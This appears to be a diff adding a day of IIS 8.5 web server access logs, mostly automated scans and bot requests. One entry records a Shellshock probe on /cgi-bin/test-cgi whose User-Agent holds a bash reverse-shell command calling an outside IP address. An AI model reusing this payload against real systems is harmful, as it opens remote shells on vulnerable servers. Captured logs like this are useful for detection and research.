@@ -1,0 +1,42 @@
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-04-27 02:19:55
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-04-27 02:19:55 172.31.22.76 GET /testproxy.php - 80 - 185.49.14.190 Mozilla/5.0+(Windows+NT+5.1;+rv:32.0)+Gecko/20100101+Firefox/31.0 - 404 0 2 302
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-04-27 02:51:42
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-04-27 02:51:42 172.31.22.76 GET /testproxy.php - 80 - 185.25.151.159 Mozilla/5.0+(Windows+NT+5.1;+rv:32.0)+Gecko/20100101+Firefox/31.0 - 404 0 2 230
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-04-27 09:53:07
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-04-27 09:53:07 172.31.22.76 GET /cgi-bin/test-cgi - 80 - 211.220.63.148 ()+{+:;+};+/bin/bash+-i+>&+/dev/tcp/41.231.112.3/16161+0<&1+2>&1+& - 404 0 64 846
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-04-27 10:31:13
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-04-27 10:31:13 172.31.22.76 GET /cache/global/img/gs.gif - 80 - 80.82.78.38 Mozilla - 404 0 2 197
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-04-27 11:39:45
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-04-27 11:39:45 172.31.22.76 HEAD / - 80 - 222.85.138.75 Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/46.0.2490.86+Safari/537.36 - 200 0 0 348
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-04-27 12:31:18
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-04-27 12:31:18 172.31.22.76 GET / - 80 - 85.25.43.94 - - 200 0 0 289
+2016-04-27 12:31:18 172.31.22.76 GET /robots.txt - 80 - 85.25.43.94 - - 404 0 2 177
+2016-04-27 12:31:18 172.31.22.76 GET /sitemap.xml - 80 - 85.25.43.94 - - 404 0 2 176
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-04-27 16:21:59
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-04-27 16:21:59 172.31.22.76 GET / - 80 - 209.126.230.74 StatsInfo - 200 0 0 391
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-04-27 23:04:01
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-04-27 23:04:01 172.31.22.76 GET / - 80 - 185.93.185.252 Research+scan,+mail+networkresearch@yandex.ru - 200 0 0 1066
